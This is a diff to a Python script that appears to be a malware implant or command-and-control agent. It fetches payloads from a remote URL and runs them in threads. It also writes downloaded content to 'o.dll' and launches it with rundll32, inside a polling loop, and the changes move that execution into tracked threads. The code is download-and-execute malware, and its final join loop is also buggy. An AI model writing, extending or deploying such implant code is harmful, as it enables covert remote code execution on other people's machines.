@@ -6,8 +6,8 @@ from multiprocessing import Process
 import base64
 import threading
 
-global th
-th = None
+global th_list
+th_list = []
 
 def exec_py():
     global payload
@@ -19,8 +19,9 @@ def execute_py_implant(url,session):
         global payload
         payload = response.text
         try:
-            global th
+            global th_list
             th = threading.Thread(target=exec_py)
+            th_list.append(th)
             th.start()
         except:
             pass
@@ -31,12 +32,13 @@ def rundll(url):
         payload = response.text
         try:
             content = requests.get(url)
-            with open("o.dll","w") as file:
-                content = base64.b64decode(bytes(content,"ascii"))
+            with open("o.dll","wb") as file:
                 file.write(content)
+            global th_list
             x = lambda:os.popen(f'rundll32 ./o.dll,entrypoint')
-            a = Process(target=x)
-            a.start()
+            th = threading.Thread(target=x)
+            th_list.append(th)
+            th.start()
             os.remove("o.dll")
         except:
             pass
@@ -107,5 +109,6 @@ while True:
     except:
         time.sleep(20)
 
-if th!=None:
-    th.join()
+if len(th_list)!=0:
+    for i in th_list:
+        th.join()
